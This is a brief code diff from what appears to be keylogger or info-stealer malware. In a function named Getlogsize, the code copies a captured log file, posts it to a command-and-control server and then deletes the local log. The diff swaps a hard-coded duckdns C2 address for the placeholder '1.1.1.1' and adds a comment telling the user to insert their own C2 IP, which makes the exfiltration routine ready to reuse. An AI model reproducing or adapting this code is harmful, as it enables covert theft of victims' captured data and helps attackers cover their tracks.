@@ -270,9 +270,10 @@ def Getlogsize():
 				with open(logfile+str(x), "w") as f2:
 					f2.write(f.read())
 
-			#Send logfile to C2
+			# Send logfile to C2
+			# Change "1.1.1.1" to c2 ip.
 			filetopost = {'file': open(logfile+str(x), 'rb')}
-			post('http://duvi.duckdns.org:1401', files=filetopost)
+			post('1.1.1.1', files=filetopost)
 			
 			time.sleep(10)
 			os.remove(logfile)
